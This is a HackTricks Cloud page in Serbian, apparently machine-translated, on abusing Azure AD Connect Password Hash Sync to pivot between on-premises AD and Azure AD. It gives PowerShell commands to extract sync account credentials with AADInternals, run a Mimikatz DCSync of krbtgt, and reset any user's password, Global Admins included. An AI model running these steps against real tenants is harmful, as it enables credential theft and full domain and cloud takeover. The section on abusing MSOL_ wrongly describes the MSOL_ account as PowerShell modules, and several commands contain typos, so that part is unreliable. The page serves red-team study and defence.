# Az - PHS - Sinhronizacija he코 lozinki

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

[Iz dokumentacije:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Sinhronizacija he코 lozinki** je jedan od metoda prijave koji se koristi za postizanje hibridnog identiteta. **Azure AD Connect** sinhronizuje he코, he코a, lozinke korisnika sa lokalnog Active Directory-ja na oblak zasnovani Azure AD.

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To je **naj캜e코캖i metod** koji koriste kompanije za sinhronizaciju lokalnog AD-a sa Azure AD-om.

Svi **korisnici** i **he코 lozinki** se sinhronizuju sa lokalnog na Azure AD. Me캠utim, **lozinke u 캜istom tekstu** ili **originalni he코evi** se ne 코alju na Azure AD.\
Osim toga, **ugra캠ene** bezbednosne grupe (kao 코to su administratorske grupe domena...) se **ne sinhronizuju** na Azure AD.

Sinhronizacija he코eva se vr코i svakih **2 minuta**. Me캠utim, podrazumevano, **istek lozinke** i **istek naloga** se **ne sinhronizuju** u Azure AD. Dakle, korisnik 캜ija je **lozinka na lokalnom AD-u istekla** (nije promenjena) mo쬰 i dalje **pristupati Azure resursima** koriste캖i staru lozinku.

Kada korisnik sa lokalnog AD-a 쬰li da pristupi Azure resursu, **autentifikacija se vr코i na Azure AD-u**.

**PHS** je potreban za funkcionalnosti kao 코to su **Identity Protection** i AAD Domain Services.

## Pivoting

Kada je PHS konfigurisan, automatski se **kreiraju** neki **privilegovani nalozi**:

* Nalog **`MSOL_<installationID>`** se automatski kreira na lokalnom AD-u. Ovom nalogu je dodeljena uloga **Directory Synchronization Accounts** (videti [dokumentaciju](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)) 코to zna캜i da ima **dozvole za replikaciju (DCSync) u lokalnom AD-u**.
* Nalog **`Sync_<ime on-prem ADConnect Server-a>_installationID`** se kreira na Azure AD-u. Ovaj nalog mo쬰 **resetovati lozinku bilo kog korisnika** (sinhronizovanog ili samo u oblaku) na Azure AD-u.

Lozinke ova dva privilegovana naloga se **캜uvaju u SQL serveru** na serveru gde je **Azure AD Connect instaliran**. Administratori mogu izvu캖i lozinke ovih privilegovanih korisnika u 캜istom tekstu.\
Baza podataka se nalazi u `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

Mogu캖e je izvu캖i konfiguraciju iz jedne od tabela, pri 캜emu je jedna enkriptovana:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**Enkriptovana konfiguracija** je enkriptovana sa **DPAPI** i sadr쬴 lozinke korisnika `MSOL_*` na lokalnom AD-u i lozinku **Sync\_\*** na Azure AD-u. Dakle, kompromitovanjem ovih lozinki mogu캖e je dobiti privilegije na AD-u i Azure AD-u.

Mo쬰te prona캖i [potpuni pregled kako se ove lozinke 캜uvaju i de코ifruju u ovom predavanju](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Pronala쬰nje **Azure AD connect server-a**

Ako je **server na kojem je instaliran Azure AD Connect** pridru쬰n domeni (preporu캜eno u dokumentaciji), mogu캖e ga je prona캖i pomo캖u:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### Zloupotreba MSOL\_\*

MSOL\_\* (Microsoft Online Services) je skup PowerShell modula koji se koriste za upravljanje Azure AD (Active Directory) i Office 365. Ovi moduli pru쬬ju funkcionalnosti za administraciju korisnika, grupa, licenci i drugih resursa u oblaku.

Jedna od tehnika zloupotrebe je iskori코캖avanje MSOL\_\* modula za izvr코avanje neovla코캖enih radnji. Ovo se mo쬰 posti캖i kori코캖enjem ukradenih ili kompromitovanih legitimacija za pristup Azure AD ili Office 365. Nakon 코to se uspostavi veza sa Azure AD, napada캜 mo쬰 izvr코avati razli캜ite komande za manipulaciju korisnicima, grupama ili drugim resursima.

Ova tehnika zloupotrebe mo쬰 biti posebno opasna u hibridnom okru쬰nju, gde se koristi Azure AD Connect za sinhronizaciju identiteta izme캠u lokalnog okru쬰nja i Azure AD. Napada캜 mo쬰 iskoristiti ovu vezu za izvr코avanje napada sa oblaka na lokalno okru쬰nje.

Da bi se spre캜ila zloupotreba MSOL\_\* modula, preporu캜uje se primena sigurnosnih mera kao 코to su:

- Redovno a쬿riranje i pra캖enje sigurnosnih zakrpa za Azure AD Connect i Office 365.
- Kori코캖enje sna쬹ih lozinki i dvofaktorne autentifikacije za Azure AD i Office 365 naloge.
- Pra캖enje i analiza logova za otkrivanje sumnjivih aktivnosti.
- Ograni캜avanje privilegija pristupa MSOL\_\* modulima samo na neophodne korisnike ili grupe.

Implementacija ovih mera mo쬰 pomo캖i u za코titi od zloupotrebe MSOL\_\* modula i odr쬬vanju sigurnosti Azure AD i Office 365 okru쬰nja.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
Mo쬰te tako캠e koristiti [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) da biste dobili ove akreditive.
{% endhint %}

### Zloupotreba Sync\_\*

Kompromitovanjem **`Sync_*`** naloga mogu캖e je **resetovati lozinku** bilo kog korisnika (uklju캜uju캖i Globalne Administratore)
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Tako캠e je mogu캖e **izmeniti lozinke samo za korisnike u oblaku** (캜ak i ako je to neo캜ekivano)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Tako캠e je mogu캖e izvu캖i lozinku ovog korisnika.

{% hint style="danger" %}
Druga opcija bi bila **dodeliti privilegovane dozvole servisnom principu**, koje **Sync** korisnik ima **dozvole** da uradi, a zatim **pristupiti tom servisnom principu** kao na캜in za privesc.
{% endhint %}

### Bezbedno SSO

Mogu캖e je koristiti Bezbedno SSO sa PHS, 코to je podlo쬹o drugim zloupotrebama. Proverite to u:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Reference

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
